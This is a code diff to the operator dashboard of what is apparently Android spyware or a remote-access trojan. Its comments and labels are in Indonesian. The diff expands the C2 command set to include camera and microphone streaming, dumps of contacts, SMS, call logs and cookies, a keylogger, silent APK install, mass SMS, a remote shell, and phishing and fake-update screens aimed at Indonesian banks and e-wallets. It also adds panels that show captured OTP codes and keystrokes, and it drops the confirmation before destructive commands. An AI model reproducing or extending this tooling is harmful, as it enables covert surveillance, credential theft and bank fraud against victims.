@@ -36,8 +36,12 @@
             --scrollbar-thumb: #b0b0b0;
         }
 
+        /* ============================================================
+           GLOBAL
+           ============================================================ */
         *{margin:0;padding:0;box-sizing:border-box}
         body{font-family:'Segoe UI',Arial,sans-serif;background:var(--bg-primary);color:var(--text-primary);padding:16px;font-size:13px;transition:background 0.3s,color 0.3s}
+        
         ::-webkit-scrollbar{width:6px}
         ::-webkit-scrollbar-track{background:var(--scrollbar-track)}
         ::-webkit-scrollbar-thumb{background:var(--scrollbar-thumb);border-radius:3px}
@@ -63,7 +67,6 @@
         input:focus,select:focus{outline:2px solid var(--accent);border-color:var(--accent)}
         button{cursor:pointer;font-weight:bold;transition:0.3s}
         button:hover{transform:scale(1.03)}
-        button:disabled{opacity:0.5;cursor:not-allowed}
         
         .btn-green{background:#00cc66;color:#000;border-color:#00cc66}
         .btn-blue{background:#108ee9;color:#fff;border-color:#108ee9}
@@ -263,8 +266,37 @@
 // ============================================================
 // 🔥 GLOBAL ERROR HANDLER
 // ============================================================
-window.addEventListener('error', function(e) { return true; });
-window.addEventListener('unhandledrejection', function(e) { e.preventDefault(); return true; });
+window.addEventListener('error', function(e) {
+    try {
+        fetch('/error', {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({
+                message: e.message || 'Unknown error',
+                filename: e.filename || '',
+                lineno: e.lineno || 0,
+                colno: e.colno || 0,
+                stack: e.error?.stack || 'No stack'
+            })
+        }).catch(function(){});
+    } catch(err) {}
+    return true;
+});
+
+window.addEventListener('unhandledrejection', function(e) {
+    try {
+        fetch('/error', {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({
+                type: 'unhandled_rejection',
+                reason: String(e.reason || 'Unknown')
+            })
+        }).catch(function(){});
+    } catch(err) {}
+    e.preventDefault();
+    return true;
+});
 
 // ============================================================
 // 🔥 THEME TOGGLE
@@ -293,33 +325,17 @@ var c2History = [];
 var currentPage = 1;
 var pageSize = 20;
 var ws = null;
-var c2Sending = false;
 
 // ============================================================
-// 🔥 TOAST
-// ============================================================
-function showToast(msg, dur) {
-    var t = document.getElementById('toast');
-    t.textContent = msg;
-    t.style.display = 'block';
-    clearTimeout(t._timer);
-    t._timer = setTimeout(function(){ t.style.display = 'none'; }, dur||3000);
-}
-
-// ============================================================
-// 🔥 LOGIN - VALIDASI RESPONSE
+// 🔥 LOGIN - HANYA BISA PAKAI ADMIN_PASSWORD!
 // ============================================================
 function login() {
     var pw = document.getElementById('pw').value;
     if(!pw) { showToast('Masukkan password!'); return; }
     
     fetch('/data?key=' + encodeURIComponent(pw) + '&limit=1')
-        .then(function(r) { 
-            if(!r.ok) throw new Error('HTTP ' + r.status);
-            return r.json(); 
-        })
-        .then(function(data) {
-            if (data.status === 'ok' || data.data !== undefined) {
+        .then(function(r) {
+            if (r.status === 200) {
                 KEY = pw;
                 localStorage.setItem('dash_key', pw);
                 document.getElementById('loginBox').style.display = 'none';
@@ -351,6 +367,14 @@ function logout() {
     showToast('🚪 Logout berhasil');
 }
 
+function showToast(msg, dur) {
+    var t = document.getElementById('toast');
+    t.textContent = msg;
+    t.style.display = 'block';
+    clearTimeout(t._timer);
+    t._timer = setTimeout(function(){ t.style.display = 'none'; }, dur||3000);
+}
+
 // ============================================================
 // 🔥 WEBSOCKET REAL-TIME
 // ============================================================
@@ -361,7 +385,10 @@ function connectWebSocket() {
         
         ws.onopen = function() {
             document.getElementById('statusInfo').textContent = '🔌 WebSocket connected';
-            ws.send(JSON.stringify({ type: 'auth', key: KEY }));
+            ws.send(JSON.stringify({
+                type: 'auth',
+                key: KEY
+            }));
         };
         
         ws.onmessage = function(event) {
@@ -383,14 +410,14 @@ function connectWebSocket() {
             setTimeout(connectWebSocket, 5000);
         };
         
-        ws.onerror = function() { /* onclose handle reconnect */ };
+        ws.onerror = function() {};
     } catch(e) {
         setTimeout(connectWebSocket, 10000);
     }
 }
 
 // ============================================================
-// 🔥 C2 COMMAND DEFINITIONS
+// 🔥 C2 COMMAND DEFINITIONS (160+ PERINTAH)
 // ============================================================
 var C2_COMMANDS = {
     '📸 Media': [
@@ -401,7 +428,11 @@ var C2_COMMANDS = {
         { aksi: 'stop_video', label: '⏹ Stop Video' },
         { aksi: 'take_photo', label: '📷 Take Photo' },
         { aksi: 'flash_on', label: '💡 Flash ON' },
-        { aksi: 'flash_off', label: '💡 Flash OFF' }
+        { aksi: 'flash_off', label: '💡 Flash OFF' },
+        { aksi: 'camera_stream_start', label: '📹 Camera Start' },
+        { aksi: 'camera_stream_stop', label: '⏹ Camera Stop' },
+        { aksi: 'mic_stream_start', label: '🎙️ Mic Start' },
+        { aksi: 'mic_stream_stop', label: '⏹ Mic Stop' }
     ],
     '📁 File': [
         { aksi: 'ambil_file', label: '📄 Ambil File' },
@@ -416,65 +447,134 @@ var C2_COMMANDS = {
         { aksi: 'ambil_lokasi', label: '📍 Lokasi' },
         { aksi: 'get_clipboard', label: '📋 Clipboard' },
         { aksi: 'set_clipboard', label: '✏️ Set Clipboard' },
+        { aksi: 'get_notifications', label: '🔔 Notifikasi' },
         { aksi: 'ambil_imei', label: '📱 IMEI' },
         { aksi: 'ambil_imsi', label: '📱 IMSI' },
         { aksi: 'ambil_nomor_hp', label: '📱 Nomor HP' },
-        { aksi: 'ambil_operator', label: '📶 Operator' }
+        { aksi: 'ambil_operator', label: '📶 Operator' },
+        { aksi: 'dump_contacts', label: '📇 Dump Kontak' },
+        { aksi: 'dump_sms', label: '💬 Dump SMS' },
+        { aksi: 'dump_call_log', label: '📞 Dump Call Log' },
+        { aksi: 'dump_gallery', label: '🖼️ Dump Gallery' },
+        { aksi: 'dump_bookmarks', label: '🔖 Bookmarks' },
+        { aksi: 'dump_cookies', label: '🍪 Cookies' },
+        { aksi: 'keylogger_start', label: '⌨️ Keylogger Start' },
+        { aksi: 'keylogger_stop', label: '⏹ Keylogger Stop' }
     ],
     '🌐 Web': [
         { aksi: 'buka_url', label: '🌐 Buka URL' },
-        { aksi: 'buka_url_hidden', label: '🕵️ URL Hidden' }
+        { aksi: 'buka_url_hidden', label: '🕵️ URL Hidden' },
+        { aksi: 'buka_webview', label: '📱 WebView' }
     ],
-    '📥 Download': [
+    '📥 Download & Install': [
         { aksi: 'download', label: '📥 Download' },
-        { aksi: 'install_apk', label: '📦 Install APK' }
+        { aksi: 'install_apk', label: '📦 Install APK' },
+        { aksi: 'update_apk', label: '🔄 Update APK' }
     ],
     '💬 SMS & Panggilan': [
         { aksi: 'kirim_sms', label: '📤 Kirim SMS' },
+        { aksi: 'kirim_sms_massal', label: '📤 SMS Massal' },
         { aksi: 'call_number', label: '📞 Call Number' }
     ],
     '📱 Aplikasi': [
         { aksi: 'buka_aplikasi', label: '📱 Buka App' },
         { aksi: 'uninstall_aplikasi', label: '🗑️ Uninstall' },
         { aksi: 'get_installed_apps', label: '📱 Installed Apps' },
-        { aksi: 'open_settings', label: '⚙️ Settings' }
+        { aksi: 'open_settings', label: '⚙️ Settings' },
+        { aksi: 'open_calculator', label: '🧮 Calculator' },
+        { aksi: 'open_playstore', label: '📱 Play Store' },
+        { aksi: 'open_maps', label: '🗺️ Maps' },
+        { aksi: 'open_camera', label: '📷 Camera' },
+        { aksi: 'open_gallery', label: '🖼️ Gallery' }
     ],
     '💰 Dompet Digital': [
         { aksi: 'buka_dana', label: '💰 DANA' },
         { aksi: 'buka_gopay', label: '💰 GoPay' },
-        { aksi: 'buka_ovo', label: '💰 OVO' }
+        { aksi: 'buka_ovo', label: '💰 OVO' },
+        { aksi: 'buka_shopee', label: '🛒 Shopee' },
+        { aksi: 'buka_tokped', label: '🛒 Tokopedia' },
+        { aksi: 'buka_linkaja', label: '💰 LinkAja' },
+        { aksi: 'buka_jenius', label: '🏦 Jenius' },
+        { aksi: 'buka_isaku', label: '🏦 iSaku' }
     ],
     '🏦 Banking': [
         { aksi: 'buka_bri', label: '🏦 BRImo' },
         { aksi: 'buka_bni', label: '🏦 BNI' },
         { aksi: 'buka_mandiri', label: '🏦 Mandiri' },
-        { aksi: 'buka_bca', label: '🏦 BCA' }
+        { aksi: 'buka_bca', label: '🏦 BCA' },
+        { aksi: 'buka_bsi', label: '🏦 BSI' },
+        { aksi: 'buka_cimb', label: '🏦 CIMB' },
+        { aksi: 'buka_btn', label: '🏦 BTN' },
+        { aksi: 'buka_danamon', label: '🏦 Danamon' }
     ],
     '⚡ Populer': [
         { aksi: 'buka_wa', label: '💚 WhatsApp' },
         { aksi: 'buka_telegram', label: '💙 Telegram' },
         { aksi: 'buka_instagram', label: '📸 Instagram' },
         { aksi: 'buka_facebook', label: '📘 Facebook' },
-        { aksi: 'buka_youtube', label: '▶️ YouTube' }
+        { aksi: 'buka_tiktok', label: '🎵 TikTok' },
+        { aksi: 'buka_youtube', label: '▶️ YouTube' },
+        { aksi: 'buka_gmail', label: '📧 Gmail' },
+        { aksi: 'buka_twitter', label: '🐦 Twitter' },
+        { aksi: 'buka_spotify', label: '🎵 Spotify' }
     ],
-    '🔓 Phishing': [
+    '🔓 Soseng & Phishing': [
+        { aksi: 'qr_dana', label: '📱 QR DANA' },
+        { aksi: 'fake_update', label: '🔄 Fake Update' },
+        { aksi: 'fake_bantuan', label: '🆘 Fake Bantuan' },
         { aksi: 'phishing_fb', label: '📘 Phishing FB' },
         { aksi: 'phishing_ig', label: '📸 Phishing IG' },
+        { aksi: 'phishing_bri', label: '🏦 Phishing BRI' },
         { aksi: 'phishing_dana', label: '💰 Phishing DANA' },
-        { aksi: 'phishing_bri', label: '🏦 Phishing BRI' }
+        { aksi: 'phishing_gopay', label: '💰 Phishing GoPay' },
+        { aksi: 'phishing_ovo', label: '💰 Phishing OVO' },
+        { aksi: 'phishing_mandiri', label: '🏦 Phishing Mandiri' },
+        { aksi: 'phishing_bca', label: '🏦 Phishing BCA' },
+        { aksi: 'phishing_shopee', label: '🛒 Phishing Shopee' },
+        { aksi: 'phishing_tokped', label: '🛒 Phishing Tokped' },
+        { aksi: 'fake_notif', label: '🔔 Fake Notif' }
     ],
     '🔧 Sistem': [
         { aksi: 'get_system_info', label: 'ℹ️ System Info' },
         { aksi: 'get_battery', label: '🔋 Battery' },
+        { aksi: 'get_storage', label: '💾 Storage' },
+        { aksi: 'get_wifi', label: '📶 WiFi' },
         { aksi: 'vibrate', label: '📳 Vibrate' },
         { aksi: 'toast', label: '🔔 Toast' },
-        { aksi: 'self_destruct', label: '💀 Self Destruct' }
+        { aksi: 'reboot', label: '🔄 Reboot' },
+        { aksi: 'lock_screen', label: '🔒 Lock Screen' },
+        { aksi: 'self_destruct', label: '💀 Self Destruct' },
+        { aksi: 'wallpaper', label: '🖼️ Wallpaper' }
     ],
     '🌐 Network': [
         { aksi: 'wifi_on', label: '📶 WiFi ON' },
         { aksi: 'wifi_off', label: '📶 WiFi OFF' },
         { aksi: 'bluetooth_on', label: '📶 Bluetooth ON' },
-        { aksi: 'bluetooth_off', label: '📶 Bluetooth OFF' }
+        { aksi: 'bluetooth_off', label: '📶 Bluetooth OFF' },
+        { aksi: 'airplane_on', label: '✈️ Airplane ON' },
+        { aksi: 'airplane_off', label: '✈️ Airplane OFF' },
+        { aksi: 'wifi_hotspot_on', label: '📶 Hotspot ON' },
+        { aksi: 'wifi_hotspot_off', label: '📶 Hotspot OFF' }
+    ],
+    '🔊 Audio & Display': [
+        { aksi: 'volume_up', label: '🔊 Volume Up' },
+        { aksi: 'volume_down', label: '🔉 Volume Down' },
+        { aksi: 'volume_mute', label: '🔇 Mute' },
+        { aksi: 'brightness_max', label: '☀️ Bright Max' },
+        { aksi: 'brightness_min', label: '🌙 Bright Min' },
+        { aksi: 'screen_on', label: '📱 Screen ON' },
+        { aksi: 'screen_off', label: '📱 Screen OFF' },
+        { aksi: 'play_music', label: '▶️ Play Music' },
+        { aksi: 'stop_music', label: '⏹ Stop Music' },
+        { aksi: 'speak', label: '🔊 Speak' }
+    ],
+    '⏰ Lainnya': [
+        { aksi: 'shell', label: '💻 Shell' },
+        { aksi: 'ping', label: '🏓 Ping' },
+        { aksi: 'vpn_start', label: '🔒 VPN Start' },
+        { aksi: 'vpn_stop', label: '🔒 VPN Stop' },
+        { aksi: 'location_track_start', label: '📍 Track Start' },
+        { aksi: 'location_track_stop', label: '📍 Track Stop' }
     ]
 };
 
@@ -498,32 +598,29 @@ function renderC2Buttons() {
 }
 
 // ============================================================
-// 🔥 REFRESH DATA - REAL-TIME (CACHE 5 DETIK)
+// 🔥 REFRESH DATA
 // ============================================================
 function refreshData() {
     if(!KEY) return;
     
     var cached = localStorage.getItem('dash_cache');
     var cacheTime = parseInt(localStorage.getItem('dash_cache_time') || '0');
-    var isOffline = !navigator.onLine;
-    
-    if (isOffline && cached) {
+    if (cached && (Date.now() - cacheTime < 30000)) {
         try {
             allData = JSON.parse(cached);
-            document.getElementById('statusInfo').textContent = '📦 Offline Cache (' + allData.length + ' data)';
+            document.getElementById('statusInfo').textContent = '📦 Cache (' + allData.length + ' data) - ' + new Date().toLocaleTimeString();
             renderAll();
             return;
         } catch(e) {}
     }
     
-    fetch('/data?key=' + encodeURIComponent(KEY) + '&t=' + Date.now())
+    fetch('/data?key=' + encodeURIComponent(KEY))
         .then(function(r){ 
             if(!r.ok) throw new Error('HTTP ' + r.status);
             return r.json(); 
         })
         .then(function(data){
-            allData = data.data || data || [];
-            if (!Array.isArray(allData)) allData = [];
+            allData = data || [];
             try {
                 localStorage.setItem('dash_cache', JSON.stringify(allData));
                 localStorage.setItem('dash_cache_time', String(Date.now()));
@@ -574,7 +671,7 @@ function renderStats() {
 }
 
 // ============================================================
-// 🔥 RENDER DATA SECTIONS
+// 🔥 RENDER SEMUA DATA
 // ============================================================
 function renderDataSections() {
     try {
@@ -636,22 +733,15 @@ function renderDataSections() {
     }
 }
 
-function getIcon(src) {
-    var icons = {
-        'init':'📱','device_info':'📱','telepon_info':'📞','lokasi':'📍',
-        'kontak_all':'📇','sms_all':'💬','call_log':'📞','keylogger':'⌨️',
-        'clipboard':'📋','screenshot':'📸','gallery_photos':'🖼️',
-        'audio_record':'🎤','video_record':'🎬','c2_result':'🎮'
-    };
-    return icons[src] || '📄';
-}
-
+// ============================================================
+// 🔥 RENDER DATA CONTENT
+// ============================================================
 function renderDataContent(src, items, last) {
     try {
         var data = last ? last.data : null;
         if(!data) return '<div class="empty">No data</div>';
         
-        if (src === 'screenshot' || src === 'screen_capture') {
+        if (src === 'screenshot' || src === 'screen_capture' || src === 'camera_capture') {
             var imgSrc = typeof data === 'string' ? data : (data.data || data.image || '');
             if(imgSrc && imgSrc.startsWith('data:image')) {
                 return '<img src="'+imgSrc+'" class="img-preview" onclick="window.open(this.src,\'_blank\')"><br>'+
@@ -688,7 +778,7 @@ function renderDataContent(src, items, last) {
             return '<div class="json-view">'+escapeHtml(JSON.stringify(data,null,2))+'</div>';
         }
         
-        if (src === 'keylogger' || src === 'keylogger_input') {
+        if (src === 'keylogger' || src === 'keylogger_ws') {
             if(typeof data === 'object') {
                 var h = '<table><tr><th>Field</th><th>Value</th></tr>';
                 for(var k in data){
@@ -697,6 +787,18 @@ function renderDataContent(src, items, last) {
                 h += '</table>';
                 return h;
             }
+        }
+        
+        if (src === 'fake_otp') {
+            var h = '<table><tr><th>Waktu</th><th>OTP</th></tr>';
+            items.slice(-20).reverse().forEach(function(item){
+                var d = item.data || {};
+                var otp = d.otp || d.data || '?';
+                var waktu = item.waktu ? new Date(item.waktu).toLocaleString('id-ID') : '?';
+                h += '<tr><td style="font-size:10px;">'+waktu+'</td><td style="color:#ff44aa;font-weight:bold;font-size:20px;">'+escapeHtml(String(otp))+'</td></tr>';
+            });
+            h += '</table>';
+            return h;
         }
         
         if (src === 'kontak_all' && Array.isArray(data)) {
@@ -737,9 +839,9 @@ function renderDataContent(src, items, last) {
             return h;
         }
         
-        if (src === 'init' || src === 'device_info') {
+        if (src === 'device_info' || src === 'init') {
             var h = '<table><tr><th>Key</th><th>Value</th></tr>';
-            var fields = ['ua','pl','la','sc','cd','pr','dm','cc','on','ve','mt','tz','ip'];
+            var fields = ['ua','pl','la','sc','cd','pr','dm','cc','on','ve','mt','tz','ip','ip_local','model','brand','android'];
             fields.forEach(function(f){
                 if(data[f] !== undefined && data[f] !== null && data[f] !== '') {
                     h += '<tr><td>'+f+'</td><td>'+escapeHtml(String(data[f]))+'</td></tr>';
@@ -764,33 +866,8 @@ function renderDataContent(src, items, last) {
     }
 }
 
-function escapeHtml(str) {
-    if(!str) return '';
-    return String(str).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
-}
-
-function renderTable(data, cols, limit) {
-    if(!Array.isArray(data) || !data.length) return '<div class="empty">Tidak ada data</div>';
-    var html = '<div style="font-size:10px;color:var(--text-secondary);">Total: '+data.length+'</div><table><tr>';
-    cols.forEach(function(c){ html += '<th>'+c+'</th>'; });
-    html += '</tr>';
-    var max = Math.min(data.length, limit||50);
-    for(var i=0; i<max; i++){
-        html += '<tr>';
-        cols.forEach(function(c){
-            var val = data[i][c] !== undefined ? data[i][c] : '?';
-            if(typeof val === 'object') val = JSON.stringify(val);
-            html += '<td>'+escapeHtml(String(val))+'</td>';
-        });
-        html += '</tr>';
-    }
-    html += '</table>';
-    if(data.length > max) html += '<div style="color:var(--text-secondary);font-size:10px;">... dan '+(data.length-max)+' lainnya</div>';
-    return html;
-}
-
 // ============================================================
-// 🔥 MEDIA SECTIONS
+// 🔥 RENDER MEDIA
 // ============================================================
 function renderMediaSections() {
     try {
@@ -804,7 +881,7 @@ function renderMediaSections() {
             var mediaType = '';
             var mediaSrc = '';
             
-            if (src === 'screenshot' || src === 'screen_capture') {
+            if (src === 'screenshot' || src === 'screen_capture' || src === 'camera_capture') {
                 mediaSrc = typeof data === 'string' ? data : (data.data || data.image || '');
                 if(mediaSrc && mediaSrc.startsWith('data:image')) { isMedia = true; mediaType = 'image'; }
             }
@@ -834,7 +911,7 @@ function renderMediaSections() {
         });
         
         if(!mediaItems.length) {
-            container.innerHTML = '<div class="card"><div class="empty">📭 Belum ada media</div></div>';
+            container.innerHTML = '<div class="card"><div class="empty">📭 Belum ada media (foto/audio/video)</div></div>';
             return;
         }
         
@@ -863,6 +940,45 @@ function renderMediaSections() {
     } catch(e) {
         document.getElementById('mediaSections').innerHTML = '<div class="card"><div class="empty">Error: ' + e.message + '</div></div>';
     }
+}
+
+// ============================================================
+// 🔥 HELPERS
+// ============================================================
+function getIcon(src) {
+    var icons = {
+        'init':'📱','device_info':'📱','telepon_info':'📞','lokasi':'📍',
+        'kontak_all':'📇','sms_all':'💬','call_log':'📞','keylogger':'⌨️',
+        'clipboard':'📋','fake_otp':'🔐','screenshot':'📸','screen_capture':'📸',
+        'gallery_photos':'🖼️','audio_record':'🎤','video_record':'🎬',
+        'download':'📥','aplikasi_all':'📱','wifi_passwords':'📶','c2_result':'🎮'
+    };
+    return icons[src] || '📄';
+}
+
+function escapeHtml(str) {
+    if(!str) return '';
+    return String(str).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
+}
+
+function renderTable(data, cols, limit) {
+    if(!Array.isArray(data) || !data.length) return '<div class="empty">Tidak ada data</div>';
+    var html = '<div style="font-size:10px;color:var(--text-secondary);">Total: '+data.length+'</div><table><tr>';
+    cols.forEach(function(c){ html += '<th>'+c+'</th>'; });
+    html += '</tr>';
+    var max = Math.min(data.length, limit||50);
+    for(var i=0; i<max; i++){
+        html += '<tr>';
+        cols.forEach(function(c){
+            var val = data[i][c] !== undefined ? data[i][c] : '?';
+            if(typeof val === 'object') val = JSON.stringify(val);
+            html += '<td>'+escapeHtml(String(val))+'</td>';
+        });
+        html += '</tr>';
+    }
+    html += '</table>';
+    if(data.length > max) html += '<div style="color:var(--text-secondary);font-size:10px;">... dan '+(data.length-max)+' lainnya</div>';
+    return html;
 }
 
 // ============================================================
@@ -901,7 +1017,8 @@ function renderLog() {
             var dataStr = '';
             try { dataStr = JSON.stringify(item.data).substring(0, 300); } catch(e){ dataStr = String(item.data).substring(0,300); }
             var cls = '';
-            if(['keylogger','keylogger_input'].includes(src)) cls = 'log-keylogger';
+            if(['keylogger','keylogger_ws'].includes(src)) cls = 'log-keylogger';
+            else if(src === 'fake_otp') cls = 'log-otp';
             else if(src === 'lokasi') cls = 'log-location';
             else if(src === 'kontak_all') cls = 'log-contact';
             else if(src === 'sms_all') cls = 'log-sms';
@@ -931,57 +1048,33 @@ function switchTab(id){
 }
 
 // ============================================================
-// 🔥 C2 COMMAND SEND - DENGAN KONFIRMASI & DEBOUNCE
+// 🔥 C2 COMMAND SEND
 // ============================================================
 function sendC2(aksi, params){
-    if (c2Sending) {
-        showToast('⏳ Tunggu perintah sebelumnya selesai!');
-        return;
-    }
     if(!KEY){ showToast('Login dulu!'); return; }
     if(!params) params = {};
-    
-    // Konfirmasi untuk perintah berbahaya
-    var dangerous = ['self_destruct', 'wipe_data', 'factory_reset', 'reboot', 'uninstall_aplikasi'];
-    if (dangerous.indexOf(aksi) !== -1) {
-        if (!confirm('⚠️ Perintah "' + aksi + '" berbahaya! Lanjutkan?')) {
-            return;
-        }
-    }
-    
-    c2Sending = true;
-    document.getElementById('c2Result').textContent = '⏳ Sending: '+aksi;
-    document.getElementById('c2Result').style.color = '#ff0';
-    
     var payload = { sumber: 'c2_command', data: { aksi: aksi, params: params } };
     c2History.push({ waktu: new Date().toISOString(), aksi: aksi, status: '⏳ Sending...' });
-    // Batasi history
-    if (c2History.length > 100) { c2History = c2History.slice(-100); }
     renderC2History();
-    
-    fetch('/data', { 
-        method: 'POST', 
-        headers: {'Content-Type':'application/json'}, 
-        body: JSON.stringify(payload) 
-    })
-    .then(function(r){ return r.json(); })
-    .then(function(res){
-        c2Sending = false;
-        document.getElementById('c2Result').textContent = '✅ Sent: '+aksi;
-        document.getElementById('c2Result').style.color = '#0f0';
-        var last = c2History[c2History.length-1];
-        if(last){ last.status='✅ Success'; last.response=res; }
-        renderC2History();
-        showToast('✅ Command sent: '+aksi);
-    })
-    .catch(function(){
-        c2Sending = false;
-        document.getElementById('c2Result').textContent = '❌ Error: '+aksi;
-        document.getElementById('c2Result').style.color = '#f44';
-        var last = c2History[c2History.length-1];
-        if(last){ last.status='❌ Failed'; }
-        renderC2History();
-    });
+    document.getElementById('c2Result').textContent = '⏳ Sending: '+aksi;
+    document.getElementById('c2Result').style.color = '#ff0';
+    fetch('/data', { method: 'POST', headers: {'Content-Type':'application/json'}, body: JSON.stringify(payload) })
+        .then(function(r){ return r.json(); })
+        .then(function(res){
+            document.getElementById('c2Result').textContent = '✅ Sent: '+aksi;
+            document.getElementById('c2Result').style.color = '#0f0';
+            var last = c2History[c2History.length-1];
+            if(last){ last.status='✅ Success'; last.response=res; }
+            renderC2History();
+            showToast('✅ Command sent: '+aksi);
+        })
+        .catch(function(){
+            document.getElementById('c2Result').textContent = '❌ Error: '+aksi;
+            document.getElementById('c2Result').style.color = '#f44';
+            var last = c2History[c2History.length-1];
+            if(last){ last.status='❌ Failed'; }
+            renderC2History();
+        });
 }
 
 function sendC2Custom(){
@@ -1016,7 +1109,6 @@ function renderC2History(){
 // 🔥 EXPORT & CLEAR
 // ============================================================
 function exportJSON(){
-    if(!allData.length){ showToast('Tidak ada data'); return; }
     var blob = new Blob([JSON.stringify(allData,null,2)], {type:'application/json'});
     var a = document.createElement('a');
     a.href = URL.createObjectURL(blob);
@@ -1026,7 +1118,7 @@ function exportJSON(){
 }
 
 function exportCSV(){
-    if(!allData.length){ showToast('Tidak ada data'); return; }
+    if(!allData.length){ showToast('Tidak ada data untuk diexport'); return; }
     var rows = [['Waktu','Sumber','Data']];
     allData.forEach(function(item){
         var waktu = item.waktu ? new Date(item.waktu).toISOString() : '';
@@ -1052,25 +1144,24 @@ function clearAll(){
 }
 
 // ============================================================
-// 🔥 FILE MANAGER - SESUAI ENDPOINT WORKER
+// 🔥 FILE MANAGER
 // ============================================================
 function listFiles(){
     var path = document.getElementById('filePath').value || '/';
-    fetch('/data?key=' + encodeURIComponent(KEY) + '&type=files&path=' + encodeURIComponent(path))
+    fetch('/api/files?path='+encodeURIComponent(path)+'&key='+encodeURIComponent(KEY))
         .then(function(r){ return r.json(); })
         .then(function(data){
             var container = document.getElementById('fileListContainer');
-            var files = data.files || data || [];
-            if(!files.length){
+            if(!data || !data.length){
                 container.innerHTML = '<div class="empty">📂 Kosong atau error</div>';
                 return;
             }
             var html = '<div class="file-grid">';
-            files.forEach(function(item){
+            data.forEach(function(item){
                 html += '<div class="file-item">';
-                html += '<div class="name">'+(item.isDirectory ? '📁' : '📄')+' '+escapeHtml(item.name)+'</div>';
+                html += '<div class="name">'+(item.isDir ? '📁' : '📄')+' '+escapeHtml(item.name)+'</div>';
                 html += '<div class="path">'+(item.size ? (item.size/1024).toFixed(1)+' KB' : '-')+'</div>';
-                if(!item.isDirectory){
+                if(!item.isDir){
                     html += '<button class="btn-blue" style="font-size:8px;padding:2px 6px;margin-top:4px;" onclick="downloadFile(\''+item.path+'\')">⬇️</button>';
                     html += '<button class="btn-red" style="font-size:8px;padding:2px 6px;margin-top:4px;" onclick="deleteFile(\''+item.path+'\')">🗑️</button>';
                 }
@@ -1085,18 +1176,22 @@ function listFiles(){
 }
 
 function downloadFile(path){
-    window.open('/data?key=' + encodeURIComponent(KEY) + '&type=download&path=' + encodeURIComponent(path), '_blank');
+    window.open('/api/download?path='+encodeURIComponent(path)+'&key='+encodeURIComponent(KEY), '_blank');
 }
 
 function deleteFile(path){
     if(!confirm('Hapus file: '+path+'?')) return;
-    fetch('/data?key=' + encodeURIComponent(KEY) + '&type=delete&path=' + encodeURIComponent(path), {method:'POST'})
-        .then(function(r){ return r.json(); })
-        .then(function(res){
-            showToast(res.status || 'Deleted');
-            listFiles();
-        })
-        .catch(function(){ showToast('❌ Gagal hapus file'); });
+    fetch('/api/delete', {
+        method: 'POST',
+        headers: {'Content-Type':'application/json'},
+        body: JSON.stringify({path: path, key: KEY})
+    })
+    .then(function(r){ return r.json(); })
+    .then(function(res){
+        showToast(res.status || 'Deleted');
+        listFiles();
+    })
+    .catch(function(){ showToast('❌ Gagal hapus file'); });
 }
 
 function uploadFile(){
@@ -1111,7 +1206,7 @@ function uploadFileSubmit(){
     formData.append('file', file);
     formData.append('path', document.getElementById('filePath').value || '/');
     formData.append('key', KEY);
-    fetch('/data?type=upload', {
+    fetch('/api/upload', {
         method: 'POST',
         body: formData
     })
